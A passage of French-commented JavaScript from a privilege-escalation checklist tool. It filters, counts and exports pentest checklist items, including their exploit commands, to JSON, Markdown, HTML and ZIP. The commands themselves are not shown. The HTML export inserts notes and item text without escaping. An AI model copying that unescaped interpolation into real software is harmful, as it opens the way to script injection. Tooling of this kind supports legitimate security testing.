    if (filtersSection) filtersSection.style.display = 'block';
}

// Activation des filtres
function enableFilters() {
    const searchInput = document.getElementById('checklist-search');
    const statusFilter = document.getElementById('checklist-filter-status');
    const tagFilter = document.getElementById('checklist-filter-tag');
    
    if (searchInput) searchInput.disabled = false;
    if (statusFilter) statusFilter.disabled = false;
    if (tagFilter) tagFilter.disabled = false;
}

// Obtenir l'icône de catégorie
function getCategoryIcon(categoryName) {
    const icons = {
        'Énumération Système': '🔍',
        'Énumération Active Directory': '🏢',
        'Permissions et Fichiers': '📁',
        'Services et Processus': '⚙️',
        'Services et Applications': '💻',
        'Tokens et Privilèges': '🎫',
        'Fichiers et Permissions': '📂',
        'Kerberos et Authentification': '🎟️',
        'Mouvement Latéral': '↔️',
        'Applications et Services': '📱',
        'Exploitation Avancée': '🚀'
    };
    
    return icons[categoryName] || '📋';
}

// Statistiques de la checklist
function getChecklistStats() {
    const stats = {
        total: 0,
        todo: 0,
        checked: 0,
        exploitable: 0,
        exploited: 0
    };
    
    Object.values(globalState.checklistState).forEach(item => {
        stats.total++;
        stats[item.status || 'todo']++;
    });
    
    return stats;
}

// Mise à jour de l'affichage des statistiques
function updateExportStats() {
    const stats = getChecklistStats();
    
    // Mettre à jour les éléments de statistiques
    const statElements = {
        total: document.querySelector('.stat-total .stat-value'),
        todo: document.querySelector('.stat-todo .stat-value'),
        checked: document.querySelector('.stat-checked .stat-value'),
        exploitable: document.querySelector('.stat-exploitable .stat-value'),
        exploited: document.querySelector('.stat-exploited .stat-value')
    };
    
    Object.entries(statElements).forEach(([key, element]) => {
        if (element) element.textContent = stats[key];
    });
    
    // Activer/désactiver les boutons d'export
    const exportButtons = document.querySelectorAll('.export-btn');
    const hasData = stats.total > 0;
    
    exportButtons.forEach(btn => {
        btn.disabled = !hasData;
    });
}

// Export en JSON
function exportToJSON() {
    const data = {
        metadata: {
            exportDate: new Date().toISOString(),
            os: globalState.currentOS,
            context: globalState.currentContext,
            version: '1.0'
        },
        statistics: getChecklistStats(),
        checklist: globalState.checklistState
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.json`);
}

// Export en Markdown
function exportToMarkdown() {
    const stats = getChecklistStats();
    const checklistData = MEGA_CHECKLIST[globalState.currentOS];
    
    let markdown = `# Checklist Privesc - ${globalState.currentOS.toUpperCase()}\n\n`;
    markdown += `**Date d'export:** ${new Date().toLocaleDateString('fr-FR')}\n`;
    markdown += `**Contexte:** ${globalState.currentContext}\n\n`;
    
    // Statistiques
    markdown += `## 📊 Statistiques\n\n`;
    markdown += `- **Total:** ${stats.total} éléments\n`;
    markdown += `- **À vérifier:** ${stats.todo} ⏳\n`;
    markdown += `- **Vérifiés:** ${stats.checked} ✅\n`;
    markdown += `- **Exploitables:** ${stats.exploitable} ⚠️\n`;
    markdown += `- **Exploités:** ${stats.exploited} 🚨\n\n`;
    
    // Checklist par catégorie
    Object.entries(checklistData).forEach(([categoryName, items]) => {
        markdown += `## ${getCategoryIcon(categoryName)} ${categoryName}\n\n`;
        
        items.forEach(item => {
            const state = globalState.checklistState[item.id] || { status: 'todo', notes: '' };
            const statusIcon = getStatusIcon(state.status);
            
            markdown += `### ${statusIcon} ${item.label}\n\n`;
            markdown += `**Description:** ${item.description}\n\n`;
            
            if (item.checkCommand) {
                markdown += `**Commande de vérification:**\n\`\`\`bash\n${item.checkCommand}\n\`\`\`\n\n`;
            }
            
            if (item.exploitCommand && (state.status === 'exploitable' || state.status === 'exploited')) {
                markdown += `**Commande d'exploitation:**\n\`\`\`bash\n${item.exploitCommand}\n\`\`\`\n\n`;
            }
            
            if (state.notes) {
                markdown += `**Notes personnelles:**\n> ${state.notes.replace(/\n/g, '\n> ')}\n\n`;
            }
            
            if (item.links && item.links.length > 0) {
                markdown += `**Liens utiles:**\n`;
                item.links.forEach(link => {
                    markdown += `- [${link}](${link})\n`;
                });
                markdown += '\n';
            }
            
            if (item.tips) {
                markdown += `**💡 Conseils:** ${item.tips}\n\n`;
            }
            
            markdown += `---\n\n`;
        });
    });
    
    const blob = new Blob([markdown], { type: 'text/markdown' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.md`);
}

// Export en HTML
function exportToHTML() {
    const stats = getChecklistStats();
    const checklistData = MEGA_CHECKLIST[globalState.currentOS];
    
    let html = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checklist Privesc - ${globalState.currentOS.toUpperCase()}</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h1 { color: #8b5cf6; border-bottom: 3px solid #8b5cf6; padding-bottom: 10px; }
        h2 { color: #06b6d4; margin-top: 30px; }
        h3 { color: #374151; }
        .stats { background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }
        .stat-item { text-align: center; padding: 10px; border-radius: 6px; }
        .stat-todo { background: #e5e7eb; }
        .stat-checked { background: #d1fae5; }
        .stat-exploitable { background: #fef3c7; }
        .stat-exploited { background: #fee2e2; }
        .item { margin: 20px 0; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px; }
        .item.checked { border-left: 4px solid #10b981; }
        .item.exploitable { border-left: 4px solid #f59e0b; }
        .item.exploited { border-left: 4px solid #ef4444; }
        .command { background: #1f2937; color: #f9fafb; padding: 15px; border-radius: 6px; font-family: monospace; white-space: pre-wrap; margin: 10px 0; }
        .notes { background: #fffbeb; border-left: 4px solid #f59e0b; padding: 15px; margin: 10px 0; }
        .links { margin: 10px 0; }
        .links a { color: #8b5cf6; text-decoration: none; margin-right: 15px; }
        .tips { background: #eff6ff; border-left: 4px solid #3b82f6; padding: 15px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔑 Checklist Privesc - ${globalState.currentOS.toUpperCase()}</h1>
        <p><strong>Date d'export:</strong> ${new Date().toLocaleDateString('fr-FR')}</p>
        <p><strong>Contexte:</strong> ${globalState.currentContext}</p>
        
        <div class="stats">
            <h2>📊 Statistiques</h2>
            <div class="stats-grid">
                <div class="stat-item stat-todo"><strong>${stats.todo}</strong><br>À vérifier</div>
                <div class="stat-item stat-checked"><strong>${stats.checked}</strong><br>Vérifiés</div>
                <div class="stat-item stat-exploitable"><strong>${stats.exploitable}</strong><br>Exploitables</div>
                <div class="stat-item stat-exploited"><strong>${stats.exploited}</strong><br>Exploités</div>
            </div>
        </div>`;
    
    Object.entries(checklistData).forEach(([categoryName, items]) => {
        html += `<h2>${getCategoryIcon(categoryName)} ${categoryName}</h2>`;
        
        items.forEach(item => {
            const state = globalState.checklistState[item.id] || { status: 'todo', notes: '' };
            
            html += `<div class="item ${state.status}">`;
            html += `<h3>${getStatusIcon(state.status)} ${item.label}</h3>`;
            html += `<p><strong>Description:</strong> ${item.description}</p>`;
            
            if (item.checkCommand) {
                html += `<p><strong>Commande de vérification:</strong></p>`;
                html += `<div class="command">${item.checkCommand}</div>`;
            }
            
            if (item.exploitCommand && (state.status === 'exploitable' || state.status === 'exploited')) {
                html += `<p><strong>Commande d'exploitation:</strong></p>`;
                html += `<div class="command">${item.exploitCommand}</div>`;
            }
            
            if (state.notes) {
                html += `<div class="notes"><strong>📝 Notes personnelles:</strong><br>${state.notes.replace(/\n/g, '<br>')}</div>`;
            }
            
            if (item.links && item.links.length > 0) {
                html += `<div class="links"><strong>🔗 Liens utiles:</strong><br>`;
                item.links.forEach(link => {
                    html += `<a href="${link}" target="_blank">${link}</a>`;
                });
                html += `</div>`;
            }
            
            if (item.tips) {
                html += `<div class="tips"><strong>💡 Conseils:</strong> ${item.tips}</div>`;
            }
            
            html += `</div>`;
        });
    });
    
    html += `</div></body></html>`;
    
    const blob = new Blob([html], { type: 'text/html' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.html`);
}

// Export complet en ZIP
async function exportToZip() {
    // Vérifier si JSZip est disponible
    if (typeof JSZip === 'undefined') {
        alert('JSZip n\'est pas chargé. Veuillez recharger la page.');
        return;
    }
    
    const zip = new JSZip();
    const stats = getChecklistStats();
    const checklistData = MEGA_CHECKLIST[globalState.currentOS];
    const timestamp = new Date().toISOString().split('T')[0];
    
    // Créer la structure de dossiers
    const todoFolder = zip.folder('01-A_Verifier');
    const checkedFolder = zip.folder('02-Verifies');
    const exploitableFolder = zip.folder('03-Exploitables');
    const exploitedFolder = zip.folder('04-Exploites');
    
    // Fichier de synthèse
    let summary = `# Synthèse Checklist Privesc - ${globalState.currentOS.toUpperCase()}\n\n`;
    summary += `Date: ${new Date().toLocaleDateString('fr-FR')}\n`;
    summary += `Contexte: ${globalState.currentContext}\n\n`;
    summary += `## Statistiques\n`;
    summary += `- Total: ${stats.total}\n`;
    summary += `- À vérifier: ${stats.todo}\n`;
    summary += `- Vérifiés: ${stats.checked}\n`;
    summary += `- Exploitables: ${stats.exploitable}\n`;
    summary += `- Exploités: ${stats.exploited}\n\n`;
    
    zip.file('README.md', summary);
    
    // Organiser les éléments par statut
    Object.entries(checklistData).forEach(([categoryName, items]) => {
        items.forEach(item => {
            const state = globalState.checklistState[item.id] || { status: 'todo', notes: '' };
            
            let content = `# ${item.label}\n\n`;
            content += `**Catégorie:** ${categoryName}\n`;
            content += `**Description:** ${item.description}\n\n`;
            
            if (item.checkCommand) {
                content += `## Commande de vérification\n\`\`\`bash\n${item.checkCommand}\n\`\`\`\n\n`;
            }
            
            if (item.exploitCommand) {
                content += `## Commande d'exploitation\n\`\`\`bash\n${item.exploitCommand}\n\`\`\`\n\n`;
            }
            
            if (state.notes) {
                content += `## Notes personnelles\n${state.notes}\n\n`;
            }
            
            if (item.links && item.links.length > 0) {
                content += `## Liens utiles\n`;
                item.links.forEach(link => content += `- ${link}\n`);
                content += '\n';
            }
            
            if (item.tips) {
                content += `## Conseils\n${item.tips}\n\n`;
            }
            
            const filename = `${categoryName.replace(/[^a-zA-Z0-9]/g, '_')}-${item.label.replace(/[^a-zA-Z0-9]/g, '_')}.md`;
            
            // Placer dans le bon dossier selon le statut
            switch (state.status) {
                case 'checked':
                    checkedFolder.file(filename, content);
                    break;
                case 'exploitable':
                    exploitableFolder.file(filename, content);
                    break;
                case 'exploited':
                    exploitedFolder.file(filename, content);
                    break;
                default:
                    todoFolder.file(filename, content);
            }
        });
    });
    
    // Générer et télécharger le ZIP
    try {
        const zipBlob = await zip.generateAsync({ type: 'blob' });
        downloadFile(zipBlob, `privesc-checklist-${globalState.currentOS}-${timestamp}.zip`);
    } catch (error) {
        console.error('Erreur lors de la génération du ZIP:', error);
        alert('Erreur lors de la génération du fichier ZIP');
    }
}

// Fonction utilitaire pour télécharger un fichier
function downloadFile(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Fonction utilitaire pour obtenir l'icône de statut
function getStatusIcon(status) {
    const icons = {
        todo: '⏳',
        checked: '✅',
        exploitable: '⚠️',
        exploited: '🚨'
    };
    return icons[status] || '⏳';
}